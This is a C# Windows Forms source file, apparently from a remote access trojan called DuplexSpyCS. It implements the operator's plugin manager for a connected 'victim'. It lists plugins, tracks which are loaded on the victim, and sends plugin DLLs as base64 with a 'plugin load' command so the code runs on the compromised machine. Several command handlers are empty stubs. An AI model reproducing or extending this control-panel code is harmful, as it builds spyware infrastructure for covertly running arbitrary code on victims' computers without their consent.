using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection.Metadata.Ecma335;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmPlugin : Form
    {
        private clsVictim m_victim { get; set; }

        private string m_szPluginDirectory { get; set; }
        private clsIniManager m_iniMgr = clsStore.ini_manager;

        public frmPlugin(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            m_szPluginDirectory = Path.Combine(Application.StartupPath, "Plugins");
        }

        private clsPlugin.stPluginInfo fnGetPluginInfoFromItem(ListViewItem item) => item.Tag == null ? new clsPlugin.stPluginInfo() : (clsPlugin.stPluginInfo)item.Tag;

        private Dictionary<string, clsPlugin.stPluginInfo> m_dicPluginInfo = new Dictionary<string, clsPlugin.stPluginInfo>();
        private Dictionary<string, clsPlugin.stPluginInfo> m_dicLoadedPlugin = new Dictionary<string, clsPlugin.stPluginInfo>();

        void fnRecv(clsListener listener, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            if (lsMsg[0] == "plugin")
            {
                if (lsMsg[1] == "ls")
                {
                    List<string[]> ls = lsMsg[2].Split(',').Select(x => clsCrypto.b64D2Str(x).Split(',')).ToList();
                    foreach (var s in ls)
                    {
                        string szName = s[0];
                        string szVersion = s[1];

                        Invoke(new Action(() =>
                        {
                            ListViewItem item = listView1.FindItemWithText(szName);
                            if (item == null)
                            {
                                MessageBox.Show(
                                    "Discovered an unknown plugin: " + szName,
                                    "Unknown Plugin",
                                    MessageBoxButtons.OK,
                                    MessageBoxIcon.Warning
                                );
                            }
                            else
                            {
                                item.SubItems[2].Text = "Loaded";

                                var info = fnGetPluginInfoFromItem(item);
                                m_dicLoadedPlugin.Add(szName, info);
                            }
                        }));
                    }
                }
                else if (lsMsg[1] == "run")
                {

                }
                else if (lsMsg[1] == "load")
                {
                    string szName = lsMsg[2];
                    Invoke(new Action(() =>
                    {
                        ListViewItem item = listView1.FindItemWithText(szName);
                        if (item == null)
                            return;

                        var info = fnGetPluginInfoFromItem(item);
                        item.SubItems[2].Text = "Loaded";
                        m_dicLoadedPlugin.Add(szName, info);
                    }));
                }
                else if (lsMsg[1] == "unload")
                {

                }
                else if (lsMsg[1] == "clear")
                {

                }
            }
        }

        void fnRefresh()
        {
            listView1.Items.Clear();

            m_dicPluginInfo.Clear();
            m_dicLoadedPlugin.Clear();

            foreach (string szDllFileName in Directory.GetFiles(m_szPluginDirectory))
            {
                if (string.Equals(Path.GetExtension(szDllFileName).Trim('.'), "json"))
                    continue;

                string szFileName = Path.GetFileNameWithoutExtension(szDllFileName);
                string szJsonFile = Path.Combine(m_szPluginDirectory, $"{szFileName}.json");

                var szJsonText = File.ReadAllText(szJsonFile);
                var meta = JsonSerializer.Deserialize<clsPlugin.stPluginMeta>(szJsonText);
                if (meta.bIsNull)
                {
                    //todo: show error message.
                    return;
                }

                ListViewItem item = new ListViewItem(meta.Name);
                item.SubItems.Add(meta.Version);
                item.SubItems.Add("Unloaded");
                item.SubItems.Add("-");
                item.SubItems.Add(meta.Description);

                var info = new clsPlugin.stPluginInfo()
                {
                    szFileName = szDllFileName,
                    Meta = meta,
                };

                item.Tag = info;
                m_dicPluginInfo.Add(meta.Name, info);

                listView1.Items.Add(item);

                var list = new List<clsPlugin.stCommandSpec>();
                foreach (var cmd in meta.command)
                {
                    list.Add(new clsPlugin.stCommandSpec()
                    {
                        PluginName = meta.Name,
                        Entry = meta.Entry,
                        Command = cmd.name,
                        Args = cmd.args,
                        Description = cmd.desc,
                    });
                }

                if (!m_victim.m_dicCommandRegistry.ContainsKey(meta.Entry))
                {
                    m_victim.m_dicCommandRegistry[meta.Entry] = list;
                }
            }

            listView1.Refresh();

            toolStripStatusLabel1.Text = $"Plugin[{listView1.Items.Count}]";

            m_victim.fnSendCommand(new string[]
            {
                "plugin",
                "ls",
            });
        }

        void fnPrintLine(string szMsg)
        {
            richTextBox1.AppendText(szMsg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnPrintInfo(string szMsg)
        {
            richTextBox1.SelectionColor = Color.Goldenrod;
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");

            richTextBox1.SelectionColor = Color.RoyalBlue;
            richTextBox1.AppendText("[*] ");

            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(szMsg);

            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnPrintOK(string szMsg)
        {
            richTextBox1.SelectionColor = Color.Goldenrod;
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");

            richTextBox1.SelectionColor = Color.LimeGreen;
            richTextBox1.AppendText("[+] ");

            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(szMsg);

            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnPrintError(string szMsg)
        {
            richTextBox1.SelectionColor = Color.Goldenrod;
            richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] ");

            richTextBox1.SelectionColor = Color.Red;
            richTextBox1.AppendText("[-] ");

            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(szMsg);

            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnPrintTable(DataTable dt)
        {
            if (dt == null || dt.Columns.Count == 0)
                return;

            int[] colWidths = new int[dt.Columns.Count];

            for (int i = 0; i < dt.Columns.Count; i++)
            {
                colWidths[i] = dt.Columns[i].ColumnName.Length;

                foreach (DataRow row in dt.Rows)
                {
                    int len = row[i]?.ToString().Length ?? 0;
                    if (len > colWidths[i])
                        colWidths[i] = len;
                }
            }

            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < dt  .Columns.Count; i++)
            {
                sb.Append(dt.Columns[i].ColumnName.PadRight(colWidths[i] + 2));
            }
            sb.AppendLine();

            for (int i = 0; i < dt.Columns.Count; i++)
            {
                sb.Append(new string('-', colWidths[i]) + "  ");
            }
            sb.AppendLine();

            foreach (DataRow row in dt.Rows)
            {
                for (int i = 0; i < dt.Columns.Count; i++)
                {
                    string text = row[i]?.ToString() ?? "";
                    sb.Append(text.PadRight(colWidths[i] + 2));
                }
                sb.AppendLine();
            }

            richTextBox1.AppendText(sb.ToString());
            richTextBox1.AppendText(Environment.NewLine);
        }

        void fnCommandHandler(List<string> lsArgs)
        {
            var dic = m_victim.m_dicCommandRegistry;
            if (lsArgs[0] == "show")
            {
                DataTable dt = new DataTable();
                dt.Columns.Add("Command");
                dt.Columns.Add("Description");

                foreach (string szName in m_dicPluginInfo.Keys)
                {
                    var info = m_dicPluginInfo[szName];
                    dt.Rows.Add(szName, info.Meta.Description);

                    fnPrintTable(dt);
                }
            }
            else if (lsArgs[0] == "loaded")
            {
                DataTable dt = new DataTable();
                dt.Columns.Add("Available Plugins");
                dt.Columns.Add("Command");
                dt.Columns.Add("Description");

                foreach (var szName in m_dicPluginInfo.Keys)
                {
                    var info = m_dicPluginInfo[szName];
                    dt.Rows.Add(szName, info.Meta.Entry, info.Meta.Description);
                }

                fnPrintTable(dt);
            }
            else if (lsArgs[0] == "help")
            {

            }
            else //Other commands.
            {
                string szEntry = lsArgs[0];
                if (!m_victim.m_dicCommandRegistry.ContainsKey(szEntry))
                {
                    fnPrintError("Cannot find command: " + szEntry);
                    return;
                }

                if (lsArgs.Count == 2 && lsArgs[1] == "help")
                {
                    var spec = dic[szEntry].Where(x => string.Equals(x.Entry, szEntry)).FirstOrDefault();

                }
            }
        }

        void fnSetup()
        {
            m_victim.m_listener.ReceivedDecoded += fnRecv;

            richTextBox1.Font = new Font("Consolas", 11);

            fnRefresh();
        }

        private void frmPlugin_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmPlugin_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        //Load
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            var lsPlugin = listView1.Items.Cast<ListViewItem>().Select(x => fnGetPluginInfoFromItem(x)).ToList();
            foreach (var plugin in lsPlugin)
            {
                if (!plugin.bIsValid)
                    continue;

                byte[] abBuffer = File.ReadAllBytes(plugin.szFileName);

                m_victim.fnSendCommand(new string[]
                {
                    "plugin",
                    "load",
                    plugin.Meta.Name,
                    Convert.ToBase64String(abBuffer),
                });
            }
        }

        //Unload
        private void toolStripButton2_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                if (!string.IsNullOrEmpty(textBox1.Text))
                {
                    List<string> lsArgs = textBox1.Text.Split(' ').ToList();
                    fnCommandHandler(lsArgs);
                }

                textBox1.Text = string.Empty;
            }
        }
    }
}
